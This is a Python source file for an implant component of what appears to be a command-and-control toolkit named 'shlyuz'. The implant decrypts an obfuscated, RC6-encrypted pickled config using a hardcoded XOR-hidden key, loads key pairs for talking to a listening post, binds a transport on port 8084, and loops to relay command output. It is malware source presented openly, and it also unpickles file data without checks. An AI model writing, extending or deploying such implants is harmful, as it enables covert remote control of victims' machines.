#!/usr/bin/env python3

import ast
import pickle
import configparser

from lib import logging
from lib import yadro

from lib.crypto import asymmetric
from lib.crypto import rc6
from lib.crypto import xor


# вживлять
class Vzhivlyat(object):
    def __init__(self):
        super(Vzhivlyat, self).__init__()
        self.logging = logging.Logging(True)  # DEBUG
        self.component_id = "c41b07a940254f1d87ba60aadb93dded"  # DEBUG
        self.config_file_path = "shlyuz.conf"
        # TODO: Check if this needs to be cleared in memory
        self.config_key = xor.single_byte_xor(b'0\x02X(\x01\x1c\x1b\x1c/Q\x1a ]%1Q', 0x69).decode('utf-8')
        self.config = configparser.RawConfigParser()
        self.config.read_string(self.decrypt_config())

        # Crypto values
        self.initial_private_key = asymmetric.private_key_from_bytes(self.config['crypto']['priv_key'])
        self.initial_public_key = self.initial_private_key.public_key
        self.initial_lp_pubkey = asymmetric.public_key_from_bytes(self.config['crypto']['lp_pk'])
        self.current_private_key = self.initial_private_key
        self.current_public_key = self.initial_public_key
        self.current_lp_pubkey = self.initial_lp_pubkey
        self.xor_key = ast.literal_eval(self.config['crypto']['xor_key'])

        self.transport = None
        self.manifest = None
        self.cmd_queue = []

    def decrypt_config(self):
        with open(self.config_file_path, "rb+") as configfile:
            config_bytes = configfile.read()
            decoded_content = xor.single_byte_xor(config_bytes, 0x69)
            pickled_decoded = pickle.loads(decoded_content)
            decrypted_contents = rc6.decrypt(self.config_key, pickled_decoded)
            decrypted_config = decrypted_contents.decode('utf-8')

        del config_bytes
        del decoded_content
        del pickled_decoded
        del decrypted_contents
        return decrypted_config


vzhivlyat = Vzhivlyat()
transport_config = {"bind_addr": "127.0.0.1", "bind_port": 8084}
vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)

# TODO: I need to happen after an initialization
while True:
    data = yadro.retrieve_output(vzhivlyat)
    yadro.relay_reply(vzhivlyat, data)